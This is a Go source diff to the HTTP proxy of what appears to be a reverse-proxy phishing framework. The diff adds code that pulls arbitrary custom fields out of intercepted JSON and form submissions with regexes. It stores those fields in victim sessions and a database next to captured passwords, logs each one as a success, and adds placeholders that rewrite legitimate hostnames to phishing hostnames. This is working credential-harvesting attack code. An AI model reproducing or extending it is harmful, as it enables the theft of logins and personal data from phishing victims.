@@ -251,6 +251,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 
+							for _, cp := range pl.custom {
+								if cp.tp == "json" {
+									cm := cp.search.FindStringSubmatch(string(json))
+									if cm != nil && len(cm) > 1 {
+										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
+										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
+										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
+											log.Error("database: %v", err)
+										}
+									}
+								}
+							}
+
 						} else {
 
 							if req.ParseForm() == nil {
@@ -273,6 +286,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
+											}
+										}
+									}
+									for _, cp := range pl.custom {
+										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
+											cm := cp.search.FindStringSubmatch(v[0])
+											if cm != nil && len(cm) > 1 {
+												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
+												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
+												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
+													log.Error("database: %v", err)
+												}
 											}
 										}
 									}
@@ -433,6 +458,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
 								re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
 								re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
+								re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
+								re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
+								re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
 								replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
 								replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
 								replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
@@ -554,6 +582,16 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 	s, ok := p.sessions[sid]
 	if ok {
 		s.SetPassword(password)
+	}
+}
+
+func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
+	if sid == "" {
+		return
+	}
+	s, ok := p.sessions[sid]
+	if ok {
+		s.SetCustom(name, value)
 	}
 }
 
